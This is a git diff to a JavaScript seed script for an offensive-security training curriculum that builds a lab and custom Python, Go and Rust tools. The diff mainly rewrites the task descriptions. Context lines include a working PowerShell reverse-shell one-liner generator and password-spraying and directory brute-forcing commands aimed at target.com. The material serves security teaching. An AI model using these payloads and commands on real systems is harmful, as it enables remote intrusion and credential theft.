@@ -27,7 +27,7 @@ const labPath = insertPath.run(
 // Module 1: Lab Infrastructure
 const mod1 = insertModule.run(labPath.lastInsertRowid, 'Lab Infrastructure Setup', 'Build the foundation: networking, hypervisor, and isolated environments', 0, now);
 
-insertTask.run(mod1.lastInsertRowid, 'Design your lab network architecture', 'Plan VLANs, subnets, and segmentation for safe testing', `## Lab Network Architecture
+insertTask.run(mod1.lastInsertRowid, 'Design your lab network architecture', 'Plan a segmented lab network with separate VLANs for attack machines, vulnerable targets, and management, designing subnets, firewall rules, and routing to contain malicious traffic during security testing', `## Lab Network Architecture
 
 ### Recommended Network Layout
 \`\`\`
@@ -112,7 +112,7 @@ sudo iptables -A FORWARD -i eth1.30 -o eth1.20 -j DROP
    - VICTIM: Isolated, no outbound
 \`\`\``, 0, now);
 
-insertTask.run(mod1.lastInsertRowid, 'Set up Proxmox virtualization server', 'Install and configure Proxmox VE for running lab VMs', `## Proxmox VE Setup
+insertTask.run(mod1.lastInsertRowid, 'Set up Proxmox virtualization server', 'Install Proxmox VE on dedicated hardware, configure storage pools for VM images, set up virtual networking with bridges and VLANs, and create VM templates for rapid lab environment deployment', `## Proxmox VE Setup
 
 ### Installation
 \`\`\`bash
@@ -209,7 +209,7 @@ qm start 101
 qm start 102
 \`\`\``, 1, now);
 
-insertTask.run(mod1.lastInsertRowid, 'Deploy Kali attack box with custom tools', 'Configure your primary attack machine with essential tools', `## Kali Attack Box Setup
+insertTask.run(mod1.lastInsertRowid, 'Deploy Kali attack box with custom tools', 'Install Kali Linux as your primary attack platform, configure custom tool repositories, set up Burp Suite, Metasploit database, and organize wordlists and scripts for efficient penetration testing workflows', `## Kali Attack Box Setup
 
 ### Base Installation
 \`\`\`bash
@@ -323,7 +323,7 @@ EOF
 // Module 2: Vulnerable Lab Deployment
 const mod2 = insertModule.run(labPath.lastInsertRowid, 'Vulnerable Machine Deployment', 'Deploy and configure intentionally vulnerable systems', 1, now);
 
-insertTask.run(mod2.lastInsertRowid, 'Deploy vulnerable web applications', 'Set up DVWA, Juice Shop, and custom vulnerable apps', `## Vulnerable Web Application Lab
+insertTask.run(mod2.lastInsertRowid, 'Deploy vulnerable web applications', 'Deploy intentionally vulnerable web applications including DVWA, OWASP Juice Shop, WebGoat, and bWAPP in Docker containers or VMs for practicing SQL injection, XSS, and other web exploitation techniques', `## Vulnerable Web Application Lab
 
 ### Docker Compose Setup
 \`\`\`yaml
@@ -502,7 +502,7 @@ EXPOSE 5000
 CMD ["python", "app.py"]
 \`\`\``, 0, now);
 
-insertTask.run(mod2.lastInsertRowid, 'Build a vulnerable Active Directory lab', 'Deploy Windows AD with intentional misconfigurations', `## Vulnerable Active Directory Lab
+insertTask.run(mod2.lastInsertRowid, 'Build a vulnerable Active Directory lab', 'Deploy a Windows domain environment with intentional misconfigurations including Kerberoastable accounts, unconstrained delegation, weak ACLs, and Group Policy vulnerabilities for practicing AD attack techniques', `## Vulnerable Active Directory Lab
 
 ### Infrastructure Requirements
 \`\`\`
@@ -620,7 +620,7 @@ cd vulnerable-AD
 # Follow setup instructions for automated deployment
 \`\`\``, 1, now);
 
-insertTask.run(mod2.lastInsertRowid, 'Deploy VulnHub machines in your lab', 'Import and configure popular VulnHub VMs', `## VulnHub Machine Deployment
+insertTask.run(mod2.lastInsertRowid, 'Deploy VulnHub machines in your lab', 'Download, import, and configure vulnerable VM images from VulnHub into your hypervisor, setting up isolated network segments and snapshots for practicing exploitation without internet exposure', `## VulnHub Machine Deployment
 
 ### Download and Import Script
 \`\`\`bash
@@ -757,7 +757,7 @@ if __name__ == '__main__':
 // Module 3: Python Offensive Tools
 const mod3 = insertModule.run(labPath.lastInsertRowid, 'Build Python Offensive Tools', 'Create custom security tools in Python', 2, now);
 
-insertTask.run(mod3.lastInsertRowid, 'Build a multi-threaded port scanner', 'Create a fast port scanner with service detection', `## Python Port Scanner
+insertTask.run(mod3.lastInsertRowid, 'Build a multi-threaded port scanner', 'Implement a concurrent TCP port scanner in Python using threading or asyncio, with configurable timeouts, service banner grabbing, and output formatting for integration with other reconnaissance tools', `## Python Port Scanner
 
 ### Basic Scanner
 \`\`\`python
@@ -901,7 +901,7 @@ python3 fast_scanner.py 10.30.30.100 -p 1-1000 --timeout 0.5
 4. Implement OS fingerprinting
 5. Add service version detection`, 0, now);
 
-insertTask.run(mod3.lastInsertRowid, 'Create a web directory brute-forcer', 'Build a tool to discover hidden web directories', `## Python Directory Brute-Forcer
+insertTask.run(mod3.lastInsertRowid, 'Create a web directory brute-forcer', 'Build a concurrent directory scanner using Python requests with wordlist processing, response filtering by status codes and content length, and recursive directory discovery for web enumeration', `## Python Directory Brute-Forcer
 
 ### Full Implementation
 \`\`\`python
@@ -1084,7 +1084,7 @@ python3 dirbuster.py http://target.com -w wordlist.txt -t 100
 python3 dirbuster.py http://target.com -w wordlist.txt -o results.txt
 \`\`\``, 1, now);
 
-insertTask.run(mod3.lastInsertRowid, 'Build a reverse shell handler', 'Create a multi-client reverse shell listener', `## Python Reverse Shell Handler
+insertTask.run(mod3.lastInsertRowid, 'Build a reverse shell handler', 'Create a multi-client reverse shell listener using Python sockets with session management, command history, file transfer capabilities, and interactive shell upgrades for post-exploitation workflows', `## Python Reverse Shell Handler
 
 ### Multi-Client Handler
 \`\`\`python
@@ -1282,7 +1282,7 @@ def powershell_reverse(host, port):
     return f'''powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('{host}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}}"'''
 \`\`\``, 2, now);
 
-insertTask.run(mod3.lastInsertRowid, 'Create an exploit framework skeleton', 'Build a modular exploit development framework', `## Python Exploit Framework
+insertTask.run(mod3.lastInsertRowid, 'Create an exploit framework skeleton', 'Design a modular exploit framework in Python with payload generation, encoder support, target configuration, and exploit module interfaces for standardized vulnerability exploitation workflows', `## Python Exploit Framework
 
 ### Framework Structure
 \`\`\`
@@ -1517,7 +1517,7 @@ if __name__ == '__main__':
 // Module 4: Go Offensive Tools
 const mod4 = insertModule.run(labPath.lastInsertRowid, 'Build Go Offensive Tools', 'Create fast, compiled security tools in Go', 3, now);
 
-insertTask.run(mod4.lastInsertRowid, 'Build a concurrent subdomain enumerator', 'Create a fast subdomain discovery tool', `## Go Subdomain Enumerator
+insertTask.run(mod4.lastInsertRowid, 'Build a concurrent subdomain enumerator', 'Write a Go tool that performs concurrent DNS resolution against wordlists, integrates with certificate transparency logs, and validates discovered subdomains for comprehensive attack surface mapping', `## Go Subdomain Enumerator
 
 ### Project Setup
 \`\`\`bash
@@ -1692,7 +1692,7 @@ GOOS=linux GOARCH=amd64 go build -o subdomain-enum-linux
 3. Add HTTP probing for found subdomains
 4. Integrate with APIs (crt.sh, SecurityTrails)`, 0, now);
 
-insertTask.run(mod4.lastInsertRowid, 'Create a password spraying tool', 'Build a tool for credential testing against services', `## Go Password Sprayer
+insertTask.run(mod4.lastInsertRowid, 'Create a password spraying tool', 'Build a Go-based password sprayer that tests credential combinations against SMB, LDAP, Kerberos, and web services with configurable timing, lockout awareness, and multi-target concurrent testing capabilities', `## Go Password Sprayer
 
 ### Implementation
 \`\`\`go
@@ -1918,7 +1918,7 @@ go build -o spray
 ./spray -t https://target.com/login -U users.txt -p 'Password1' -delay 1s
 \`\`\``, 1, now);
 
-insertTask.run(mod4.lastInsertRowid, 'Build a network service scanner', 'Create a fast service enumeration tool', `## Go Service Scanner
+insertTask.run(mod4.lastInsertRowid, 'Build a network service scanner', 'Develop a concurrent port scanner in Go with service fingerprinting, banner grabbing, version detection, and JSON output for integrating into automated reconnaissance pipelines', `## Go Service Scanner
 
 ### Implementation
 \`\`\`go
@@ -2147,7 +2147,7 @@ go build -o scanner
 // Module 5: Rust Offensive Tools
 const mod5 = insertModule.run(labPath.lastInsertRowid, 'Build Rust Offensive Tools', 'Create high-performance, safe security tools in Rust', 4, now);
 
-insertTask.run(mod5.lastInsertRowid, 'Build a fast hash cracker', 'Create a multi-threaded password hash cracker', `## Rust Hash Cracker
+insertTask.run(mod5.lastInsertRowid, 'Build a fast hash cracker', 'Implement a high-performance password cracker in Rust with parallel hash computation using rayon, dictionary and rule-based attacks, and support for common hash types like MD5, SHA-1, and NTLM', `## Rust Hash Cracker
 
 ### Project Setup
 \`\`\`bash
@@ -2306,7 +2306,7 @@ cargo build --release
 4. Implement hash identification
 5. Add bcrypt/scrypt support (slower, need different approach)`, 0, now);
 
-insertTask.run(mod5.lastInsertRowid, 'Create a file integrity checker', 'Build a tool for detecting file modifications', `## Rust File Integrity Checker
+insertTask.run(mod5.lastInsertRowid, 'Create a file integrity checker', 'Build a file integrity monitoring tool in Rust that computes cryptographic hashes, stores baseline snapshots, detects modifications using inotify, and generates alerts for security-critical file changes', `## Rust File Integrity Checker
 
 ### Implementation
 \`\`\`rust
